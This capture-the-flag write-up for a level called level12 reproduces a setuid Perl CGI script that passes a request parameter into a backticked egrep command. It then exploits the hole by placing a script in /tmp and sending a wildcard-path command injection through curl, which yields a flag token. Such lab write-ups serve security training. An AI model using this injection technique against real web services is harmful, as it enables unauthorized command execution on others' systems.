# level12

```bash
ls -l
# -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

Basically, the first argument is capitalized and everything after a space is wiped, \
But it still give an access to a shell \
We can copy this script in `/tmp/A`:

```bash
#!/usr/bin/env bash

echo `whoami` `getflag` > /tmp/flag12
```

Then run:
```bash
curl localhost:4646?x='`/*/A`'
cat /tmp/flag12
# flag12 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
